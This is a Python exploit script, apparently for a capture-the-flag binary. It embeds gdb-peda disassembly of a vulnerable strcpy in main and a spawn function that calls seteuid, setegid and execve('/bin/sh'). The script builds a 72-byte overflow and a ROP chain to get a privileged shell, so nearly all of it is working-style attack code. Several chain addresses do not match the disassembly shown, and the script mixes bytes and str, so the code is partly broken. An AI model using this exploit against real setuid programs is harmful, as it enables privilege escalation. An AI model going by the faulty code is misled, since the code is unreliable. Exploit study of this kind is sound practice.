'''
gdb-peda$ info funct
All defined functions:

Non-debugging symbols:
0x0000000000000618  _init
0x0000000000000640  strcpy@plt
0x0000000000000650  puts@plt
0x0000000000000660  execve@plt
0x0000000000000670  setegid@plt
0x0000000000000680  seteuid@plt
0x0000000000000690  __cxa_finalize@plt
0x00000000000006a0  _start
0x00000000000006d0  deregister_tm_clones
0x0000000000000710  register_tm_clones
0x0000000000000760  __do_global_dtors_aux
0x00000000000007a0  frame_dummy
0x00000000000007d0  spawn
0x0000000000000813  main
0x0000000000000860  __libc_csu_init
0x00000000000008d0  __libc_csu_fini
0x00000000000008d4  _fini

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000555555554813 <+0>:	push   rbp
   0x0000555555554814 <+1>:	mov    rbp,rsp
   0x0000555555554817 <+4>:	sub    rsp,0x50
   0x000055555555481b <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x000055555555481e <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000555555554822 <+15>:	cmp    DWORD PTR [rbp-0x44],0x2
   0x0000555555554826 <+19>:	jne    0x55555555484e <main+59>
   0x0000555555554828 <+21>:	mov    rax,QWORD PTR [rbp-0x50]
   0x000055555555482c <+25>:	add    rax,0x8
   0x0000555555554830 <+29>:	mov    rdx,QWORD PTR [rax]
   0x0000555555554833 <+32>:	lea    rax,[rbp-0x40]
   0x0000555555554837 <+36>:	mov    rsi,rdx
   0x000055555555483a <+39>:	mov    rdi,rax
   0x000055555555483d <+42>:	call   0x555555554640 <strcpy@plt>
   0x0000555555554842 <+47>:	lea    rax,[rbp-0x40]
   0x0000555555554846 <+51>:	mov    rdi,rax
   0x0000555555554849 <+54>:	call   0x555555554650 <puts@plt>
   0x000055555555484e <+59>:	mov    eax,0x0
   0x0000555555554853 <+64>:	leave  
   0x0000555555554854 <+65>:	ret    
End of assembler dump.
gdb-peda$ pdis spawn
Dump of assembler code for function spawn:
   0x00005555555547d0 <+0>:	push   rbp
   0x00005555555547d1 <+1>:	mov    rbp,rsp
   0x00005555555547d4 <+4>:	sub    rsp,0x10
   0x00005555555547d8 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x00005555555547df <+15>:	mov    DWORD PTR [rbp-0x8],0x0
   0x00005555555547e6 <+22>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00005555555547e9 <+25>:	mov    edi,eax
   0x00005555555547eb <+27>:	call   0x555555554680 <seteuid@plt>
   0x00005555555547f0 <+32>:	mov    eax,DWORD PTR [rbp-0x8]
   0x00005555555547f3 <+35>:	mov    edi,eax
   0x00005555555547f5 <+37>:	call   0x555555554670 <setegid@plt>
   0x00005555555547fa <+42>:	mov    edx,0x0
   0x00005555555547ff <+47>:	mov    esi,0x0
   0x0000555555554804 <+52>:	lea    rdi,[rip+0xd9]        # 0x5555555548e4
   0x000055555555480b <+59>:	call   0x555555554660 <execve@plt>
   0x0000555555554810 <+64>:	nop
   0x0000555555554811 <+65>:	leave  
   0x0000555555554812 <+66>:	ret    
End of assembler dump.

STRINGS:
[0x000006a0]> iz~bin
000 0x000008e4 0x000008e4   7   8 (.rodata) ascii /bin/sh

GADGETS:
0x00000000000008c3 : pop rdi ; ret
0x00000000000008c2 : pop r15 ; ret

CALLS:
0x00005555555547eb <+27>:	call   0x555555554680 <seteuid@plt>
0x00005555555547f5 <+37>:	call   0x555555554670 <setegid@plt>
0x000055555555480b <+59>:	call   0x555555554660 <execve@plt>

r $(python -c "print 'A'*72 + '\xc3\x48\x55\x55\x55\x55\xe4\x48\x55\x55\x55\x55\x0b\x48\x55\x55\x55\x55'")

'''

import struct
import sys

buf = b''
buf += 'A'*72
buf += struct.pack('<Q', 0x5555555548c3) # pop rdi; ret
buf += struct.pack('<Q', 0x0) # arg 0
buf += struct.pack('<Q', 0x5555555548eb) # call to seteuid
buf += struct.pack('<Q', 0x0) # arg 0
buf += struct.pack('<Q', 0x5555555547f4) # call to setegid
buf += struct.pack('<Q', 0x5555555548c3) # pop rdi; ret
buf += struct.pack('<Q', 0x5555555548e4) # string /bin/sh
buf += struct.pack('<Q', 0x55555555480b) # call to execve

sys.stdout.write(buf)
